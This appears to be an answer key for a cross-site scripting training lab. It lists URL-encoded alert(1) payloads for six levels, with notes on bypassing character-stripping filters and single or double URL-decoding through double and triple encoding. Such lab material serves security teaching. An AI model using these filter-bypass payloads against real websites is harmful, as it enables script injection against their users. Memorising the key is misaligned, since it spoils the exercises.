# specialchar — solutions

Filters that strip a single special character (backslash, semicolon, colon, null) or perform URL-decoding before reflecting.

### specialchar-level1

`/specialchar/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only `\` stripped; raw tags fine

### specialchar-level2

`/specialchar/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only `;` stripped; no semicolon needed in onerror call

### specialchar-level3

`/specialchar/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only `:` stripped; tag still works

### specialchar-level4

`/specialchar/level4/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: `<script>alert(1)</script>`
- context: server URI.decode once; double-encode survives `params` then decode yields tags

### specialchar-level5

`/specialchar/level5/?query=%25253Cscript%25253Ealert(1)%25253C/script%25253E`

- payload: `<script>alert(1)</script>`
- context: server URI.decode twice; triple-encode survives

### specialchar-level6

`/specialchar/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only null bytes stripped; raw reflection
